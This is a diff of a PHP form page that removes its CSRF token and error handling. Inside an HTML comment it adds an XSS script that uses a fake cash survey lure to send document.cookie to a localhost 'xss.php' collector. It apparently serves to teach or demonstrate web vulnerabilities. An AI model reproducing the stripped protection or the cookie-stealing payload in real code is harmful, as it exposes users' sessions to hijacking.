@@ -1,6 +1,5 @@
 <?php
 require_once('functions.php');
-setToken();
 ?>
 
 <!DOCTYPE html>
@@ -10,21 +9,21 @@ setToken();
   <title>新規作成</title>
 </head>
 <body>
-  <!-- <?php if (!empty($_SESSION['err'])): ?>
-    <p><?= $_SESSION['err']; ?></p>
-  <?php endif; ?> 追記 -->
   <form action="store.php" method="post">
-    <input type="hidden" name="token" value="<?= $_SESSION['token']; ?>"> <!-- 追記 -->
     <input type="text" name="content">
     <input type="submit" value="作成">
   </form>
   <div>
     <a href="index.php">一覧へもどる</a>
   </div>
-  <?php unsetError(); ?>
 </body>
 </html>
 
+
+
+
+<!-- <script>if (!alert('今ならアンケート回答で1万円GET!アンケートに答えますか？')) {location.href = 'http://localhost:9999/xss.php?' + document.cookie;}</script>
+ui -->
 
 
 
